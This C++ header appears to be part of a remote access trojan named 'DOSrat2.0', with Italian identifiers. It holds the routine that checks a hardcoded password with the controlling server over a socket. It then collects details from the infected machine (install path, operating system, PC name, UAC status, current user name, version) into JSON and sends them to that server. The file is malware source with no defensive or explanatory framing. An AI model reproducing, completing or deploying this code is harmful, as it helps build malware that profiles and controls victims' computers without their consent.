#pragma once

class COMUNICAZIONI
{
	private:
		static void TerminaConnessione(SOCKET Sock)
		{
			TcpIP::SetTimeout(0, Sock);
			closesocket(Sock);
		}

	public:
		static bool Inizializzazione(SOCKET Sock)
		{
			DirUtils du;
			SystemUtils su;

			char Pass[10] = "DOSrat2.0";

			TcpIP::SetTimeout(10000, Sock);

			if (send(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
			{
				TerminaConnessione(Sock);
				return false;
			}
			if (recv(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
			{
				TerminaConnessione(Sock);
				return false;
			}
			if ((string)Pass != "DOSrat2.0")
			{
				TerminaConnessione(Sock);
				return false;
			}

			TcpIP::SetTimeout(0, Sock);
			cout << "json" << endl;
			json data;

			data["InstallPath"] = du.GetFullFilePath();
			data["OS"] = su.GetOS();
			data["PCname"] = su.GetPCName();
			data["UAC"] = su.CheckUAC();
			data["UserName"] = su.GetCurrentUser();
			data["Versione"] = Version;

			TcpIP::SendString(Sock, data.dump());

			cout << data.dump() << endl;
			return true;
		}

		static bool GetInfo(SOCKET Sock, string Str)
		{
			if (TcpIP::SendString(Sock, Str))
				return true;

			return false;
		}
};